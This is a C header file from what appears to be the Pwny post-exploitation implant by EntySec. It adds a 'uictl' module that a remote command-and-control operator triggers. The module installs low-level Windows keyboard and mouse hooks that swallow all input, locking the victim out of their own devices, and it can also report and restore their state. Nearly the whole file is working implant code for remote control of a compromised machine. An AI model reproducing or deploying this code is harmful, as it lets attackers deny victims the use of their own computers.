/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _UICTL_H_
#define _UICTL_H_

#include <windows.h>

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>

#define UICTL_BASE 10

#define UICTL_SET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UICTL_BASE, \
                       API_CALL)

#define UICTL_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       UICTL_BASE, \
                       API_CALL + 1)

#define TLV_TYPE_UICTL_DEVICE  TLV_TYPE_CUSTOM(TLV_TYPE_INT, UICTL_BASE, API_TYPE)
#define TLV_TYPE_UICTL_ENABLE  TLV_TYPE_CUSTOM(TLV_TYPE_INT, UICTL_BASE, API_TYPE + 1)

#define UICTL_MOUSE    0
#define UICTL_KEYBOARD 1
#define UICTL_ALL      2

static HHOOK hMouseHook = NULL;
static HHOOK hKeyboardHook = NULL;

static LRESULT CALLBACK uictl_mouse_hook(int nCode, WPARAM wParam, LPARAM lParam)
{
    /* Swallow all mouse events */
    if (nCode >= 0)
    {
        return 1;
    }

    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}

static LRESULT CALLBACK uictl_keyboard_hook(int nCode, WPARAM wParam, LPARAM lParam)
{
    /* Swallow all keyboard events */
    if (nCode >= 0)
    {
        return 1;
    }

    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

static int uictl_disable_mouse(void)
{
    if (hMouseHook != NULL)
    {
        return 0;
    }

    hMouseHook = SetWindowsHookExA(WH_MOUSE_LL, uictl_mouse_hook,
                                   GetModuleHandle(NULL), 0);

    return (hMouseHook != NULL) ? 0 : -1;
}

static int uictl_enable_mouse(void)
{
    if (hMouseHook == NULL)
    {
        return 0;
    }

    if (UnhookWindowsHookEx(hMouseHook))
    {
        hMouseHook = NULL;
        return 0;
    }

    return -1;
}

static int uictl_disable_keyboard(void)
{
    if (hKeyboardHook != NULL)
    {
        return 0;
    }

    hKeyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, uictl_keyboard_hook,
                                      GetModuleHandle(NULL), 0);

    return (hKeyboardHook != NULL) ? 0 : -1;
}

static int uictl_enable_keyboard(void)
{
    if (hKeyboardHook == NULL)
    {
        return 0;
    }

    if (UnhookWindowsHookEx(hKeyboardHook))
    {
        hKeyboardHook = NULL;
        return 0;
    }

    return -1;
}

static tlv_pkt_t *uictl_set(c2_t *c2)
{
    /* Enable or disable a UI input device (mouse/keyboard).
     *
     * :in u32(TLV_TYPE_UICTL_DEVICE): device (0=mouse, 1=keyboard, 2=all)
     * :in u32(TLV_TYPE_UICTL_ENABLE): 1=enable, 0=disable
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
     */

    int device;
    int enable;
    int result;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_UICTL_DEVICE, &device) < 0 ||
        tlv_pkt_get_u32(c2->request, TLV_TYPE_UICTL_ENABLE, &enable) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    result = 0;

    switch (device)
    {
        case UICTL_MOUSE:
            result = enable ? uictl_enable_mouse() : uictl_disable_mouse();
            break;

        case UICTL_KEYBOARD:
            result = enable ? uictl_enable_keyboard() : uictl_disable_keyboard();
            break;

        case UICTL_ALL:
            result = enable ? uictl_enable_mouse() : uictl_disable_mouse();
            if (result == 0)
            {
                result = enable ? uictl_enable_keyboard() : uictl_disable_keyboard();
            }
            break;

        default:
            return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    if (result == -1)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *uictl_get(c2_t *c2)
{
    /* Get the current state of UI input devices.
     *
     * :out u32(TLV_TYPE_UICTL_DEVICE): requested device
     * :out u32(TLV_TYPE_UICTL_ENABLE): 1=enabled, 0=disabled
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS
     */

    int device;
    int enabled;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_UICTL_DEVICE, &device) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    switch (device)
    {
        case UICTL_MOUSE:
            enabled = (hMouseHook == NULL) ? 1 : 0;
            break;

        case UICTL_KEYBOARD:
            enabled = (hKeyboardHook == NULL) ? 1 : 0;
            break;

        default:
            return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    {
        tlv_pkt_t *result;

        result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
        tlv_pkt_add_u32(result, TLV_TYPE_UICTL_DEVICE, device);
        tlv_pkt_add_u32(result, TLV_TYPE_UICTL_ENABLE, enabled);

        return result;
    }
}

void register_uictl_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, UICTL_SET, uictl_set);
    api_call_register(api_calls, UICTL_GET, uictl_get);
}

#endif
